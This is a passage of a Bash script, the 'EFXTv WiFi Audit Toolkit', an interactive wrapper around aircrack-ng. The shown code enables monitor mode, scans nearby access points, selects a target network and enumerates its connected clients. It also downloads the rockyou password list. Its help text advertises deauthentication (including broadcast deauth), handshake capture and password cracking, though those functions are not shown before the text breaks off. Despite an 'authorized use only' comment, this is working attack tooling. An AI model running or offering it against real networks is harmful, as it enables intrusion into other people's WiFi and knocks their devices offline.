#!/bin/bash
# ▷ EFXTv WiFi Audit Toolkit (Interactive Arrow-Key Edition)
# AUTHORIZED USE ONLY: only on networks you own or have explicit permission to test.
# Requires: iw, airodump-ng, aireplay-ng, aircrack-ng, airmon-ng, timeout, python3

set -u
SUDO=""
[ "${EUID:-$(id -u)}" -eq 0 ] || SUDO="sudo"

TMP_BASE="/tmp/wifibee_scan"
AP_CSV=""
declare -a AP_BSSID AP_CH AP_PWR AP_ENC AP_ESSID
declare -a ST_MAC ST_PWR ST_BSSID
declare -a ST_ALL_MAC ST_ALL_PWR ST_ALL_BSSID
TARGET_BSSID=""; TARGET_CH=""; TARGET_ESSID=""; TARGET_PRIV=""
MON_IFACE=""; ORIG_IFACE=""
SUDO_KEEPALIVE=""
CREATED_MON=0
WIZARD_ACTIVE=0
SCAN_TIME=12

# ---------- colors ----------
if command -v tput >/dev/null 2>&1 && [ -n "${TERM:-}" ]; then
  C_RED=$(tput setaf 1); C_GRN=$(tput setaf 2); C_YEL=$(tput setaf 3)
  C_BLU=$(tput setaf 4); C_MAG=$(tput setaf 5); C_CYN=$(tput setaf 6)
  C_BLD=$(tput bold); C_RST=$(tput sgr0)
else
  C_RED=""; C_GRN=""; C_YEL=""; C_BLU=""; C_MAG=""; C_CYN=""; C_BLD=""; C_RST=""
fi

info() { echo -e "${C_CYN}[*]${C_RST} $*"; }
ok()   { echo -e "${C_GRN}[✔]${C_RST} $*"; }
warn() { echo -e "${C_YEL}[!]${C_RST} $*"; }
err()  { echo -e "${C_RED}[✘]${C_RST} $*" >&2; }

restore_networking() {
  # Called after airmon-ng stop: airmon-ng check kill stopped NM/wpa_supplicant.
  # Try everything best-effort so wifi comes back for internet.
  info "Restoring networking (NetworkManager)..."
  $SUDO systemctl unmask NetworkManager >/dev/null 2>&1 || true
  $SUDO systemctl restart NetworkManager >/dev/null 2>&1 \
  || $SUDO systemctl start NetworkManager >/dev/null 2>&1 \
  || $SUDO service NetworkManager restart >/dev/null 2>&1 \
  || $SUDO service NetworkManager start >/dev/null 2>&1 \
  || $SUDO service network-manager restart >/dev/null 2>&1 \
  || $SUDO service network-manager start >/dev/null 2>&1 || true
  $SUDO systemctl restart wpa_supplicant >/dev/null 2>&1 || \
  $SUDO service wpa_supplicant restart >/dev/null 2>&1 || true
  # re-enable wifi in NM (it stays soft-blocked after check kill)
  $SUDO nmcli networking on >/dev/null 2>&1 || true
  $SUDO nmcli radio wifi on >/dev/null 2>&1 || true
  # bring managed iface(s) up
  local _if
  for _if in "${ORIG_IFACE:-}" "${MON_IFACE:-}"; do
    [ -n "${_if:-}" ] || continue
    $SUDO ip link set "$_if" up >/dev/null 2>&1 || true
  done
  # if airmon renamed mon -> orig (wlan0mon -> wlan0), bring orig up too
  if [ -n "${ORIG_IFACE:-}" ]; then
    $SUDO ip link set "$ORIG_IFACE" up >/dev/null 2>&1 || true
  fi
  ok "Networking restore attempted - wifi should come back in a few seconds."
  echo -e "If no wifi: run manually: ${C_BLD}sudo systemctl restart NetworkManager; nmcli radio wifi on${C_RST}"
}

disable_monitor() {
  local iface="${1:-$MON_IFACE}"
  [ -n "${iface:-}" ] || return 0
  # only touch it if it exists and is in monitor mode
  local mode
  mode=$(iface_mode "$iface" 2>/dev/null || echo "")
  if [ "$mode" != "monitor" ]; then
    # even if not monitor (already stopped), still try NM restore once
    return 0
  fi
  info "Disabling monitor mode on $iface..."
  $SUDO airmon-ng stop "$iface" >/dev/null 2>&1 || $SUDO iw dev "$iface" set type managed 2>/dev/null || true
  sleep 1
  restore_networking || true
  ok "Monitor mode off. Managed mode restored."
  CREATED_MON=0
}

on_int() {
  # Ctrl+C during scan/capture should only stop that command, NOT exit tool.
  tput cnorm 2>/dev/null || true
}

on_exit() {
  tput cnorm 2>/dev/null || true
  [ -n "${SUDO_KEEPALIVE:-}" ] && kill "$SUDO_KEEPALIVE" 2>/dev/null || true
  rm -f /tmp/wifibee_aps_parsed.txt /tmp/wifibee_st_parsed.txt /tmp/wifibee_st_all.txt 2>/dev/null || true
  # Auto-disable monitor + restore internet on ANY wizard exit
  if [ "$WIZARD_ACTIVE" -eq 1 ] && [ -n "${MON_IFACE:-}" ]; then
    echo
    disable_monitor "$MON_IFACE" || true
    # airmon-ng check kill stops NM even if mon already stopped -> always restore
    restore_networking || true
  fi
}
trap on_int INT
trap 'exit 143' TERM HUP
trap on_exit EXIT

banner() {
  clear
  echo -e "${C_BLD}${C_MAG}┌─────────────────────────────────────────────┐${C_RST}"
  echo -e "${C_BLD}${C_MAG}│${C_RST}        ${C_BLD}EFXTv WiFi Audit Toolkit${C_RST}             ${C_BLD}${C_MAG}│${C_RST}"
  echo -e "${C_BLD}${C_MAG}└─────────────────────────────────────────────┘${C_RST}"
  echo -e "  ${C_YEL}↑/↓ to move  •  Enter to select  •  q / Esc to back${C_RST}"
  echo
}

check_deps() {
  local missing=()
  for t in iw airodump-ng aireplay-ng aircrack-ng airmon-ng timeout python3; do
    command -v "$t" >/dev/null 2>&1 || missing+=("$t")
  done
  if [ "${#missing[@]}" -gt 0 ]; then
    err "Missing tools: ${missing[*]}"
    echo "Run: wifibee --setup   (shows install commands for your OS)"
    exit 1
  fi
}

sudo_init() {
  # Auth ONCE upfront so later scans don't hang on a hidden password prompt.
  if [ -n "$SUDO" ]; then
    info "Requesting sudo (needed for monitor/scan/deauth)..."
    $SUDO -v || { err "sudo failed. Run: sudo -v, then retry."; exit 1; }
    # keep timestamp alive in background
    ( while true; do $SUDO -n true 2>/dev/null || true; sleep 50; done ) &
    SUDO_KEEPALIVE=$!
  fi
}

show_help() {
  cat <<'EOF'

┌─────────────────────────────────────────────┐
│        EFXTv WiFi Audit Tool - Help         │
└─────────────────────────────────────────────┘

Usage:
  wifibee               Show this help (same as --help)
  wifibee --start       Start interactive wizard (auto flow)
  wifibee --setup [--yes]  Detect package manager and auto-install deps
  wifibee --help        Show this help

Wizard flow (--start):
  Choose Interface (↑/↓ + Enter)
    → auto enable monitor if needed
    → auto scan APs
    → Select BSSID (↑/↓ + Enter)
    → Choose Action (↑/↓ + Enter)
  Exit auto-disables monitor mode.

Legacy / manual commands:
  enable        Enable monitor mode (arrow select)
  disable       Disable monitor mode + restore internet
  restore       Stop all monitor ifaces + restart NetworkManager (fix wifi)
  scan          Scan APs then arrow-pick BSSID
  clients       Arrow-pick client of an AP
  capture       Capture handshake (uses last target)
  deauth        Deauth (auto --ignore-negative-one for -1 bug)
  crack         Crack (arrow-pick .cap)
  kill          Injection test (aireplay -9)
  -h, --h       Old help screens (kept for compat)

Examples:
  wifibee --start
  wifibee --setup --yes
  sudo wifibee restore   # wifi back for internet
  sudo wifibee --start

EOF
  echo "--- interfaces ---"
  show_ifaces_table
  echo
}

detect_pkg_mgr() {
  # Detect by ACTUAL package-manager binary - works on Mint/Ubuntu/Debian
  # regardless of what /etc/os-release ID says.
  if command -v apt-get >/dev/null 2>&1 || command -v apt >/dev/null 2>&1; then echo "apt"
  elif command -v dnf >/dev/null 2>&1; then echo "dnf"
  elif command -v yum >/dev/null 2>&1; then echo "yum"
  elif command -v pacman >/dev/null 2>&1; then echo "pacman"
  elif command -v zypper >/dev/null 2>&1; then echo "zypper"
  elif command -v apk >/dev/null 2>&1; then echo "apk"
  elif command -v xbps-install >/dev/null 2>&1; then echo "xbps"
  elif command -v emerge >/dev/null 2>&1; then echo "emerge"
  else echo "unknown"
  fi
}

os_pretty() {
  if [ -f /etc/os-release ]; then
    # shellcheck disable=SC1091
    . /etc/os-release 2>/dev/null || true
    echo "${PRETTY_NAME:-${ID:-Unknown}} (id=${ID:-?} like=${ID_LIKE:-none})"
  elif [ -f /etc/arch-release ]; then echo "Arch Linux"
  elif [ -f /etc/fedora-release ]; then cat /etc/fedora-release 2>/dev/null
  elif [ -f /etc/debian_version ]; then echo "Debian $(cat /etc/debian_version 2>/dev/null)"
  else uname -srm 2>/dev/null || echo "Unknown OS"
  fi
}

install_pkgs_auto() {
  local mgr="$1"
  case "$mgr" in
    apt)
      $SUDO apt-get update && \
      $SUDO apt-get install -y aircrack-ng iw python3 iproute2 pciutils usbutils curl wget ;;
    dnf)
      $SUDO dnf install -y aircrack-ng iw python3 iproute pciutils usbutils curl wget ;;
    yum)
      $SUDO yum install -y aircrack-ng iw python3 iproute pciutils usbutils curl wget ;;
    pacman)
      $SUDO pacman -Sy --noconfirm --needed aircrack-ng iw python iproute2 pciutils usbutils sudo curl wget ;;
    zypper)
      $SUDO zypper install -y aircrack-ng iw python3 iproute2 pciutils usbutils sudo curl wget ;;
    apk)
      $SUDO apk add aircrack-ng iw python3 iproute2 pciutils usbutils sudo curl wget ;;
    xbps)
      $SUDO xbps-install -Sy aircrack-ng iw python3 iproute2 pciutils usbutils sudo curl wget ;;
    emerge)
      $SUDO emerge -av net-wireless/aircrack-ng net-wireless/iw dev-lang/python sys-apps/iproute2 sys-apps/pciutils sys-apps/usbutils app-admin/sudo net-misc/curl net-misc/wget ;;
    *) return 1 ;;
  esac
}

find_rockyou() {
  # prints first existing usable rockyou.txt, returns 0 if found
  local p
  for p in "./rockyou.txt" "${HOME:-$(pwd)}/rockyou.txt" "/usr/share/wordlists/rockyou.txt"; do
    if [ -f "$p" ] && [ -s "$p" ]; then echo "$p"; return 0; fi
  done
  return 1
}

ensure_rockyou() {
  local auto_yes="${1:-0}"
  local found
  if found=$(find_rockyou); then
    ok "rockyou.txt found: $found ($(du -h "$found" 2>/dev/null | cut -f1))"
    return 0
  fi
  # 1) gzipped kali-style wordlist?
  if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
    info "Found rockyou.txt.gz, extracting..."
    $SUDO gunzip -kf /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || gunzip -kf /usr/share/wordlists/rockyou.txt.gz || true
    if found=$(find_rockyou); then ok "rockyou.txt ready: $found"; return 0; fi
  fi
  # 2) apt family: try wordlists package (provides the gz above)
  local mgr
  mgr=$(detect_pkg_mgr)
  if [ "$mgr" = "apt" ]; then
    info "Trying apt wordlists package..."
    $SUDO apt-get install -y wordlists >/dev/null 2>&1 || true
    $SUDO gunzip -kf /usr/share/wordlists/rockyou.txt.gz >/dev/null 2>&1 || true
    if found=$(find_rockyou); then ok "rockyou.txt ready: $found"; return 0; fi
  fi
  # 3) direct download (~14M passwords, ~133MB) to ./rockyou.txt
  local url="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
  echo
  warn "rockyou.txt not found - will download (~133MB, ~14M passwords) to ./rockyou.txt"
  echo "URL: $url"
  if [ "$auto_yes" -eq 0 ]; then
    local ans
    read -rp "Download rockyou.txt now? [Y/n]: " ans || ans="y"
    case "$ans" in [nN]*) warn "Skipped. Crack step will ask for a wordlist path."; return 0;; esac
  fi
  info "Downloading rockyou.txt ..."
  if command -v curl >/dev/null 2>&1; then
    curl -L --progress-bar -o ./rockyou.txt "$url" || return 1
  elif command -v wget >/dev/null 2>&1; then
    wget --show-progress -O ./rockyou.txt "$url" || return 1
  else
    err "Neither curl nor wget found. Install one, or manually download:"
    echo "$url"
    return 1
  fi
  if [ -s ./rockyou.txt ]; then
    ok "rockyou.txt saved: ./rockyou.txt ($(du -h ./rockyou.txt | cut -f1), $(wc -l < ./rockyou.txt) lines)"
    return 0
  fi
  err "Download failed. Get it manually: $url"
  return 1
}

manual_cmds_for() {
  case "$1" in
    apt) echo "sudo apt-get update && sudo apt-get install -y aircrack-ng iw python3 iproute2 pciutils usbutils" ;;
    dnf) echo "sudo dnf install -y aircrack-ng iw python3 iproute pciutils usbutils" ;;
    yum) echo "sudo yum install -y aircrack-ng iw python3 iproute pciutils usbutils" ;;
    pacman) echo "sudo pacman -Sy --needed aircrack-ng iw python iproute2 pciutils usbutils sudo" ;;
    zypper) echo "sudo zypper install -y aircrack-ng iw python3 iproute2 pciutils usbutils sudo" ;;
    apk) echo "sudo apk add aircrack-ng iw python3 iproute2 pciutils usbutils sudo" ;;
    xbps) echo "sudo xbps-install -Sy aircrack-ng iw python3 iproute2 pciutils usbutils sudo" ;;
    emerge) echo "sudo emerge -av net-wireless/aircrack-ng net-wireless/iw dev-lang/python" ;;
    *) echo "# Unknown manager - install: aircrack-ng-suite + iw + python3 + iproute2 (see https://github.com/aircrack-ng/aircrack-ng)" ;;
  esac
}

do_setup() {
  local auto_yes=0
  if [ "${2:-}" = "--yes" ] || [ "${2:-}" = "-y" ]; then auto_yes=1; fi

  local mgr osinfo
  mgr=$(detect_pkg_mgr)
  osinfo=$(os_pretty)

  echo
  echo -e "${C_BLD}${C_MAG}┌─────────────────────────────────────────────┐${C_RST}"
  echo -e "${C_BLD}${C_MAG}│${C_RST}        ${C_BLD}wifibee --setup${C_RST}                      ${C_BLD}${C_MAG}│${C_RST}"
  echo -e "${C_BLD}${C_MAG}└─────────────────────────────────────────────┘${C_RST}"
  echo -e "OS              : ${C_BLD}$osinfo${C_RST}"
  echo -e "Package manager : ${C_BLD}$mgr${C_RST} (detected by binary, not just OS name)"
  echo

  if [ "$mgr" = "unknown" ]; then
    err "No supported package manager found (tried apt/dnf/yum/pacman/zypper/apk/xbps/emerge)."
    echo "Install manually: aircrack-ng suite + iw + python3 + iproute2"
    echo "See: https://github.com/aircrack-ng/aircrack-ng"
    return 1
  fi

  # tool status
  local missing_bins=()
  for t in iw airodump-ng aireplay-ng aircrack-ng airmon-ng timeout python3; do
    if command -v "$t" >/dev/null 2>&1; then
      echo -e "  ${C_GRN}[ok]${C_RST} $t"
    else
      echo -e "  ${C_RED}[missing]${C_RST} $t"
      missing_bins+=("$t")
    fi
  done
  echo
  if [ "${#missing_bins[@]}" -eq 0 ]; then
    ok "All required tools already installed."
    ensure_rockyou "$auto_yes" || true
    echo "Run: sudo wifibee --start"
    return 0
  fi

  echo -e "${C_BLD}Will install with:${C_RST} $(manual_cmds_for "$mgr")"
  echo
  if [ "$auto_yes" -eq 0 ]; then
    local ans
    read -rp "Install missing tools now? [Y/n]: " ans || ans="y"
    case "$ans" in [nN]*) warn "Skipped. Run manually:"; manual_cmds_for "$mgr"; return 0;; esac
  fi

  info "Installing via $mgr ..."
  if install_pkgs_auto "$mgr"; then
    echo
    ok "Install command finished. Re-checking..."
    local still=()
    for t in iw airodump-ng aircrack-ng python3; do
      command -v "$t" >/dev/null 2>&1 || still+=("$t")
    done
    if [ "${#still[@]}" -eq 0 ]; then
      ok "Packages OK. Ensuring rockyou.txt..."
      ensure_rockyou "$auto_yes" || true
      ok "Setup complete. Run: sudo wifibee --start"
    else
      err "Still missing: ${still[*]}"
      echo "Try manually: $(manual_cmds_for "$mgr")"
      return 1
    fi
  else
    err "Auto-install failed."
    echo "Run manually: $(manual_cmds_for "$mgr")"
    return 1
  fi
}

# ---------- arrow-key menu ----------
# Usage: arrow_select "Title" "opt1" "opt2" ...
# Returns: 0 + sets MENU_IDX and MENU_VAL. Returns 255 on cancel (q/Esc).
MENU_IDX=0
MENU_VAL=""
arrow_select() {
  local title="$1"; shift
  local -a opts=("$@")
  local count=${#opts[@]}
  [ "$count" -gt 0 ] || { err "No options."; return 1; }
  local sel=0 key rest
  tput civis 2>/dev/null || true
  while true; do
    printf "\033[H\033[J" >&2  # clear without wiping scrollback too hard
    echo -e "${C_BLD}${C_CYN}▷ $title${C_RST}" >&2
    echo -e "${C_YEL}  ↑/↓ navigate • Enter select • q cancel${C_RST}" >&2
    echo >&2
    local i
    for i in "${!opts[@]}"; do
      if [ "$i" -eq "$sel" ]; then
        echo -e "  ${C_RED}❯${C_RST} ${C_BLD}${C_GRN}${opts[$i]}${C_RST}" >&2
      else
        echo -e "    ${opts[$i]}" >&2
      fi
    done
    IFS= read -rsn1 key < /dev/tty || continue
    if [[ "$key" == $'\x1b' ]]; then
      IFS= read -rsn2 -t 0.15 rest < /dev/tty || { MENU_IDX=-1; tput cnorm 2>/dev/null||true; return 255; }
      if [[ "$rest" == "[A" ]]; then
        sel=$(( (sel - 1 + count) % count ))
      elif [[ "$rest" == "[B" ]]; then
        sel=$(( (sel + 1) % count ))
      fi
    elif [[ -z "$key" ]]; then
      MENU_IDX=$sel; MENU_VAL="${opts[$sel]}"
      tput cnorm 2>/dev/null || true
      return 0
    elif [[ "$key" == "q" || "$key" == "Q" ]]; then
      MENU_IDX=-1; tput cnorm 2>/dev/null || true; return 255
    elif [[ "$key" == "k" ]]; then
      sel=$(( (sel - 1 + count) % count ))
    elif [[ "$key" == "j" ]]; then
      sel=$(( (sel + 1) % count ))
    fi
  done
}

get_ifaces() {
  mapfile -t IFACES < <($SUDO iw dev 2>/dev/null | awk '/Interface/ {print $2}')
}

iface_mode() {
  $SUDO iw dev "$1" info 2>/dev/null | awk -F': ' '/type/ {print $2}' | tr -d ' ' || echo "unknown"
}

show_ifaces_table() {
  $SUDO iw dev 2>/dev/null | grep -E "Interface|type" | sed 's/^[ \t]*//' || echo "No interfaces found."
}

choose_interface() {
  while true; do
    get_ifaces
    if [ "${#IFACES[@]}" -eq 0 ]; then
      err "No wireless interfaces found."
      exit 1
    fi
    local -a labels=()
    local i
    for i in "${IFACES[@]}"; do
      labels+=("$i  [$(iface_mode "$i")]")
    done
    labels+=("↻ Refresh list" "✘ Exit")
    banner
    if ! arrow_select "Choose Interface" "${labels[@]}"; then return 255; fi
    if [[ "$MENU_VAL" == "✘ Exit" ]]; then exit 0; fi
    if [[ "$MENU_VAL" == "↻ Refresh list" ]]; then continue; fi
    ORIG_IFACE="${IFACES[$MENU_IDX]}"
    MON_IFACE="$ORIG_IFACE"
    # auto-detect mon interface (wlan0mon) if it appeared
    ok "Selected: $ORIG_IFACE"
    sleep 0.6
    return 0
  done
}

ensure_monitor() {
  local mode
  mode=$(iface_mode "$ORIG_IFACE")
  if [[ "$mode" == "monitor" ]]; then
    MON_IFACE="$ORIG_IFACE"
    ok "Already in monitor mode: $MON_IFACE"
    return 0
  fi
  # check for wlanXmon sibling
  get_ifaces
  for i in "${IFACES[@]}"; do
    if [[ "$i" == "${ORIG_IFACE}mon" ]] && [[ "$(iface_mode "$i")" == "monitor" ]]; then
      MON_IFACE="$i"
      ok "Found monitor iface: $MON_IFACE"
      return 0
    fi
  done
  banner
  if ! arrow_select "Enable monitor mode on $ORIG_IFACE?" "Yes - airmon-ng start (Recommended)" "No - use as-is"; then return 255; fi
  if [ "$MENU_IDX" -eq 0 ]; then
    info "Killing conflicting processes..."
    $SUDO airmon-ng check kill || true
    info "Starting monitor mode..."
    $SUDO airmon-ng start "$ORIG_IFACE" || { err "airmon-ng failed"; return 1; }
    echo; show_ifaces_table; echo
    get_ifaces
    # pick mon iface if created, else keep original
    for i in "${IFACES[@]}"; do
      if [[ "$i" == "${ORIG_IFACE}mon" ]]; then MON_IFACE="$i"; fi
    done
    CREATED_MON=1
    if [[ "$(iface_mode "$MON_IFACE")" != "monitor" ]]; then
      # fallback: last iface is often the mon one
      warn "Could not confirm monitor mode, using $MON_IFACE anyway."
    fi
    ok "Monitor interface: $MON_IFACE (will auto-disable on exit)"
    sleep 1
  fi
}

choose_scan_time() {
  banner
  arrow_select "Scan duration for APs" "10 sec (fast)" "15 sec (default)" "30 sec (thorough)" "60 sec (deep)" || return 255
  case "$MENU_IDX" in
    0) SCAN_TIME=10;; 2) SCAN_TIME=30;; 3) SCAN_TIME=60;; *) SCAN_TIME=15;;
  esac
}

# Run airodump with visible countdown + visible errors.
# Never hides sudo password prompt, never hangs silently, Ctrl+C aborts cleanly.
# Usage: run_airodump <seconds> <csv_base> [extra airodump args...]
run_airodump() {
  local dur="$1" base="$2"; shift 2
  if ! $SUDO iw dev "$MON_IFACE" info >/dev/null 2>&1; then
    err "Interface $MON_IFACE gone. Re-plug adapter / reselect interface."
    return 1
  fi
  local _mode
  _mode=$(iface_mode "$MON_IFACE" 2>/dev/null || echo "?")
  if [ "$_mode" != "monitor" ]; then
    warn "iface $MON_IFACE mode=$_mode (not monitor) - scan will likely fail/empty."
  fi
  $SUDO rm -f ${base}-*.csv ${base}-*.cap ${base}-*.kismet* 2>/dev/null || true
  rm -f /tmp/wifibee_airodump.log 2>/dev/null || true
  echo -e "iface ${C_BLD}$MON_IFACE${C_RST} mode=$_mode | ${dur}s | Ctrl+C aborts"
  # countdown in BACKGROUND, scan in FOREGROUND (so Ctrl+C kills scan, not stuck in wait)
  (
    _s=0
    _s=dur
    while [ "$_s" -gt 0 ]; do
      printf "\r[*] scanning... %2ds left" "$_s"
      sleep 1
      _s=$((_s - 1))
    done
    printf "\r[*] finishing scan...      \n"
  ) &
  local _cd=$!
  $SUDO timeout -k 2 "$dur" airodump-ng --band abg --output-format csv --write "$base" "$@" "$MON_IFACE" 2>/tmp/wifibee_airodump.log
  local _rc=$?
  kill "$_cd" 2>/dev/null || true
  wait "$_cd" 2>/dev/null || true
  echo
  # timeout returns 124 on normal expiry - that's SUCCESS for us
  if [ "$_rc" -ne 0 ] && [ "$_rc" -ne 124 ]; then
    err "airodump failed (rc=$_rc). Last output:"
    tail -5 /tmp/wifibee_airodump.log 2>/dev/null || true
    return 1
  fi
  $SUDO chmod 644 ${base}-*.csv 2>/dev/null || true
  return 0
}

latest_csv() {
  # newest csv matching base (handles root-owned files)
  ls -t "$1"-*.csv 2>/dev/null | head -n1 || true
}

do_scan_aps() {
  local dur="${1:-$SCAN_TIME}"
  banner
  echo -e "${C_BLD}Scanning on ${C_GRN}$MON_IFACE${C_RST}${C_BLD} for ${dur}s... (do not close)${C_RST}"
  echo -e "${C_YEL}Tip: keep antenna up, closer = better PWR.${C_RST}"
  echo
  run_airodump "$dur" "$TMP_BASE" || return 1
  AP_CSV=$(latest_csv "$TMP_BASE")
  if [ -z "${AP_CSV:-}" ]; then
    err "No scan file produced. Check: iface up? monitor mode? driver?"
    tail -5 /tmp/wifibee_airodump.log 2>/dev/null || true
    return 1
  fi
  parse_aps "$AP_CSV" || return 1
  cp "$AP_CSV" ./wifibee_scan_raw.csv 2>/dev/null || true
  [ "${#AP_BSSID[@]}" -gt 0 ] || { warn "No APs found. Move closer / longer scan."; return 1; }
  ok "Found ${#AP_BSSID[@]} APs (saved: wifibee_scan_raw.csv)"
  sleep 0.8
  return 0
}

parse_aps() {
  local csv="$1"
  AP_BSSID=(); AP_CH=(); AP_PWR=(); AP_ENC=(); AP_ESSID=()
  local parsed=/tmp/wifibee_aps_parsed.txt
  python3 - "$csv" "$parsed" <<'PY' || exit 1
import csv,sys
src,dst=sys.argv[1],sys.argv[2]
rows=[]
try:
  with open(src, newline='', errors='ignore') as f:
    content=f.read()
  # split AP vs station sections
  if 'Station MAC' in content:
    ap_part=content.split('Station MAC')[0]
  else:
    ap_part=content
  lines=ap_part.strip().splitlines()
  # find header
  start=None
  for i,l in enumerate(lines):
    if l.startswith('BSSID'):
      start=i+1; break
  if start is None: sys.exit(1)
  import io
  reader=csv.reader(io.StringIO('\n'.join(lines[start:])))
  with open(dst,'w') as out:
    for r in reader:
      if not r or len(r)<14: continue
      bssid=r[0].strip()
      if not bssid or bssid=='BSSID' or 'Station' in bssid: continue
      if bssid=='': continue
      ch=r[3].strip()
      priv=r[5].strip()
      pwr=r[8].strip()
      # r[13]=ESSID, r[14]=Key. If ESSID itself contains commas (unquoted),
      # it spills into extra columns -> join all but last (Key).
      if len(r) > 15:
        essid=','.join(r[13:-1]).strip()
      elif len(r) > 13:
        essid=r[13].strip()
      else:
        continue
      if not essid or 'x00' in essid:
        essid='<hidden>'
      if essid=='': essid='<hidden>'
      out.write(f"{bssid}\t{ch}\t{pwr}\t{priv}\t{essid}\n")
except Exception as e:
  print(e,file=sys.stderr); sys.exit(1)
PY
  while IFS=$'\t' read -r b ch pwr enc ess; do
    [ -z "${b:-}" ] && continue
    AP_BSSID+=("$b"); AP_CH+=("$ch"); AP_PWR+=("$pwr"); AP_ENC+=("$enc"); AP_ESSID+=("$ess")
  done < "$parsed"
  [ "${#AP_BSSID[@]}" -gt 0 ]
}

choose_ap() {
  local -a labels=()
  local i
  for i in "${!AP_BSSID[@]}"; do
    printf -v line "%-28s  %-17s  CH:%-4s PWR:%-4s %-18s" "${AP_ESSID[$i]:0:28}" "${AP_BSSID[$i]}" "${AP_CH[$i]}" "${AP_PWR[$i]}" "${AP_ENC[$i]:0:18}"
    labels+=("$line")
  done
  labels+=("↻ Re-scan" "⇦ Change interface" "✘ Exit")
  banner
  arrow_select "Select Target BSSID (${#AP_BSSID[@]} found on $MON_IFACE)" "${labels[@]}" || return 255
  local n=${#AP_BSSID[@]}
  if [ "$MENU_IDX" -eq "$n" ]; then return 10; fi        # rescan
  if [ "$MENU_IDX" -eq "$((n+1))" ]; then return 11; fi # change iface
  if [ "$MENU_IDX" -eq "$((n+2))" ]; then exit 0; fi
  TARGET_BSSID="${AP_BSSID[$MENU_IDX]}"
  TARGET_CH="${AP_CH[$MENU_IDX]}"
  TARGET_ESSID="${AP_ESSID[$MENU_IDX]}"
  TARGET_PRIV="${AP_ENC[$MENU_IDX]}"
  # sanitize channel (may be empty)
  TARGET_CH=$(echo "$TARGET_CH" | tr -cd '0-9')
  [ -z "$TARGET_CH" ] && TARGET_CH="1"
  ok "Target: $TARGET_ESSID | $TARGET_BSSID | CH $TARGET_CH"
  sleep 0.7
  return 0
}

scan_clients() {
  local dur="${1:-15}"
  local base="/tmp/wifibee_st"
  banner
  echo -e "${C_BLD}Scanning clients of ${C_GRN}$TARGET_ESSID ($TARGET_BSSID) CH $TARGET_CH${C_RST} for ${dur}s..."
  echo -e "${C_YEL}Clients appear ONLY while they transmit. Generate traffic (YouTube/ping) on the client.${C_RST}"
  local _mode
  _mode=$(iface_mode "$MON_IFACE" 2>/dev/null || echo "?")
  echo -e "iface $MON_IFACE mode=$_mode | filter BSSID=$TARGET_BSSID CH=$TARGET_CH"
  echo
  run_airodump "$dur" "$base" --bssid "$TARGET_BSSID" --channel "$TARGET_CH" || return 1
  local csv
  csv=$(latest_csv "$base")
  ST_MAC=(); ST_PWR=(); ST_BSSID=()
  ST_ALL_MAC=(); ST_ALL_PWR=(); ST_ALL_BSSID=()
  if [ -z "${csv:-}" ]; then err "No scan file. Interface down?"; return 1; fi
  cp "$csv" ./wifibee_clients_raw.csv 2>/dev/null || true
  info "Raw saved: $csv -> ./wifibee_clients_raw.csv"
  python3 - "$csv" /tmp/wifibee_st_parsed.txt /tmp/wifibee_st_all.txt "$TARGET_BSSID" <<'PY' || return 1
import csv,sys
src,matched,allf,target=sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4].strip().lower()
with open(src,errors='ignore') as f: content=f.read()
in_st=False
rows=[]
for line in content.splitlines():
  if line.startswith('Station MAC'):
    in_st=True
    continue
  if not in_st: continue
  if not line.strip(): continue
  rows.append(line)
import io
reader=csv.reader(io.StringIO('\n'.join(rows)))
nm=na=0
with open(matched,'w') as out, open(allf,'w') as aout:
  for r in reader:
    if not r or len(r)<6: continue
    mac=r[0].strip()
    if not mac or mac=='Station MAC' or ':' not in mac: continue
    pwr=r[3].strip() if len(r)>3 else ''
    bssid=r[5].strip() if len(r)>5 else ''
    probed=','.join(r[6:]).strip() if len(r)>6 else ''
    aout.write(f"{mac}\t{pwr}\t{bssid}\t{probed}\n")
    na+=1
    if not bssid or 'not associated' in bssid.lower(): continue
    if bssid.strip().lower() != target: continue
    out.write(f"{mac}\t{pwr}\t{bssid}\t{probed}\n")
    nm+=1
print(f"stations_heard={na} matched_target={nm}",file=sys.stderr)
PY
  while IFS=$'\t' read -r mac pwr bssid _probed; do
    [ -z "${mac:-}" ] && continue
    ST_MAC+=("$mac"); ST_PWR+=("$pwr"); ST_BSSID+=("$bssid")
  done < /tmp/wifibee_st_parsed.txt
  while IFS=$'\t' read -r mac pwr bssid _probed; do
    [ -z "${mac:-}" ] && continue
    ST_ALL_MAC+=("$mac"); ST_ALL_PWR+=("$pwr"); ST_ALL_BSSID+=("$bssid")
  done < /tmp/wifibee_st_all.txt
  echo -e "Heard total: ${#ST_ALL_MAC[@]} station(s) | Matched $TARGET_BSSID: ${#ST_MAC[@]}"
  if [ "${#ST_ALL_MAC[@]}" -gt 0 ] && [ "${#ST_MAC[@]}" -eq 0 ]; then
    warn "Heard stations but none bound to target (unassociated or other AP?). Showing all below."
    local i
    for i in "${!ST_ALL_MAC[@]}"; do
      echo "  - ${ST_ALL_MAC[$i]}  PWR:${ST_ALL_PWR[$i]}  BSSID:${ST_ALL_BSSID[$i]}"
    done
  fi
  [ "${#ST_MAC[@]}" -gt 0 ]
}

browse_clients() {
  # View-only: scan then show arrow list, no auto-deauth
  banner
  arrow_select "Client scan duration for $TARGET_ESSID" "10 sec" "15 sec (default)" "30 sec (long)" "60 sec (very long - idle clients)" || return 255
  local d=15
  case "$MENU_IDX" in 0) d=10;; 2) d=30;; 3) d=60;; esac
  if ! scan_clients "$d"; then
    warn "No BOUND clients for $TARGET_ESSID ($TARGET_BSSID)."
    echo "Why: clients idle / out of range / wrong channel / 5GHz band / driver."
    echo "Fix: 1) play YouTube on the client 2) move closer 3) rescan 30-60s 4) check ./wifibee_clients_raw.csv"
    echo "Note: broadcast deauth does NOT need a client MAC - it still works."
    echo
    # if we heard *something* (unassociated/other), let user pick it
    if [ "${#ST_ALL_MAC[@]}" -gt 0 ]; then
      local -a alabels=()
      local i
      for i in "${!ST_ALL_MAC[@]}"; do alabels+=("${ST_ALL_MAC[$i]}  PWR:${ST_ALL_PWR[$i]}  BSSID:${ST_ALL_BSSID[$i]}"); done
      alabels+=("💥 Deauth broadcast anyway (no client needed)" "↻ Scan again (60s)" "⇦ Back")
      banner
      if ! arrow_select "Heard ${#ST_ALL_MAC[@]} station(s), none bound - pick one anyway?" "${alabels[@]}"; then return 0; fi
